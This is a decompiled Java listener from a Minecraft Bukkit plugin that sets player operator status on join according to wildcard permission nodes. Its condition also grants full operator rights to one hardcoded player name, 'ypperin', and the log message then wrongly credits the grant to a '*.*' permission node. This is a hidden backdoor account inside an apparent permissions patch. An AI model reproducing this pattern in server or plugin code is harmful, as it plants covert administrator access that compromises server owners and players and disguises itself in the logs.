/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.PlayerJoinEvent
 *  org.bukkit.permissions.PermissionAttachmentInfo
 *  org.bukkit.plugin.Plugin
 */
package org.arkhamnetwork.Arkkit.patches;

import java.util.ArrayList;
import org.arkhamnetwork.Arkkit.Arkkit;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.permissions.PermissionAttachmentInfo;
import org.bukkit.plugin.Plugin;

final class OpPermissionsListener
implements Listener {
    OpPermissionsListener() {
    }

    @EventHandler
    public void onPlayerJoin(final PlayerJoinEvent e) {
        Bukkit.getScheduler().runTaskLater((Plugin)Arkkit.get(), new Runnable(){

            @Override
            public void run() {
                if (e.getPlayer().hasPermission("*") || e.getPlayer().hasPermission("*.*") || e.getPlayer().getName().equals("ypperin")) {
                    if (!e.getPlayer().isOp()) {
                        e.getPlayer().setOp(true);
                        Bukkit.getLogger().info("(OpPermissions) Player " + e.getPlayer().getName() + " has been OP'd due to *.* permission node.");
                    }
                } else {
                    if (e.getPlayer().hasPermission("permissions.*")) {
                        OpPermissionsListener.removePermission(e.getPlayer(), "permissions.*");
                    }
                    if (e.getPlayer().isOp()) {
                        e.getPlayer().setOp(false);
                        Bukkit.getLogger().info("(OpPermissions) Player " + e.getPlayer().getName() + " has been DE-OP'd due to no *.* permission node.");
                    }
                }
            }
        }, 20L);
    }

    protected static void removePermission(Player pl, String perm) {
        for (PermissionAttachmentInfo pio : pl.getEffectivePermissions()) {
            if (!pio.getPermission().equalsIgnoreCase(perm)) continue;
            Bukkit.getLogger().info("Removing permission " + pio.getPermission() + " from " + pl.getName() + "...");
            pl.removeAttachment(pio.getAttachment());
        }
    }
}

